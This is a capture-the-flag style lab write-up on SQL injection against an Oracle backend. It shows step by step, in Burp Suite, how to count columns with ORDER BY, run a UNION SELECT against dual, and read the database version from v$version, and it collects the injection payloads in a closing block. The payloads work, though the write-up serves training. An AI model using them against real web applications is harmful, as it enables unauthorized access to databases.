# 📝 Lab: SQL injection attack, querying the database type and version on Oracle

- **Vulnerability:** SQL Injection.
- **Difficulty:** Apprentice.
- **Objective:** Find out the database type and its exact version.

---

## 🛠️ Tools Used
- Browser (FoxyProxy)
- Burp Suite

## 🧠 Concept & Background
As the title hints, the backend is running **Oracle SQL**. To check the database version in Oracle, we can use two specific queries:
- `SELECT banner FROM v$version`
- `SELECT version FROM v$instance`

To extract this data, we use a **UNION attack**. In short, `UNION` is an SQL operator that allows us to combine the results of multiple `SELECT` statements into one single result. 
**The catch:** A UNION attack only works if both tables return the *same number of columns* and have compatible *data types*. 

Additionally, a strict rule in Oracle SQL is that every `SELECT` statement must have a `FROM` clause. If we just want to test if our payload works without querying a real table, we must use a built-in dummy table provided by Oracle called `dual`.

---

## 🐾 Steps to Reproduce
1. Open the lab's main page, turn on the *FoxyProxy* extension, and click on any category (e.g., Pets).
2. Open **Burp Suite -> Proxy -> HTTP History**, find the request, and press `Ctrl+R` to send it to **Repeater**.
3. In Repeater, look at the first line of the request: `GET /filter?category=Pets HTTP/2`. The `category` parameter is our vulnerable injection point.
4. First, we need to find out how many columns are in the original query. We inject an `ORDER BY` payload right after the category value:
   `GET /filter?category=Pets'+ORDER+BY+1-- ` *(Note: the `+` sign is used as a URL-encoded space).*
   Keep increasing the number (`ORDER BY 2`, `ORDER BY 3`) until the server throws an internal error. In this case, `ORDER BY 3` causes an error, which means there are exactly **2 columns**.
5. Now that we know the column count, we test the UNION attack using the `dual` table:
   `GET /filter?category=Pets'+UNION+SELECT+NULL,NULL+FROM+dual-- `
   The server returns a **200 OK**, confirming our injection is working perfectly.
6. Finally, we inject our payload to check the database version:
   `GET /filter?category=Pets'+UNION+SELECT+banner,NULL+FROM+v$version-- `
7. Done! The **Lab Solved** banner will pop up, and if you look at the response in Repeater, you will see the Oracle version strings printed on the page (e.g., `CORE 11.2.0.2.0 Production`).

<img width="1917" height="907" alt="Screenshot 2026-09-14 153927" src="https://github.com/user-attachments/assets/029164c3-1718-417c-bcea-c90b38ead871" />

---

## 🎯 Impact
By knowing the exact type and version of the database, an attacker can easily escalate the attack. The easiest next step is looking up existing public vulnerabilities (CVEs) specific to that exact Oracle version for targeted and more dangerous exploitation.

---

## 💣 Payload
```sql
'+ORDER+BY+1--
'+UNION+SELECT+NULL,NULL+FROM+dual--
'+UNION+SELECT+banner,NULL+FROM+v$version--
```
## 🔗 Reference:
For more powerful payloads, check out the [PortSwigger SQLi Cheat Sheet.](https://portswigger.net/web-security/sql-injection/cheat-sheet)
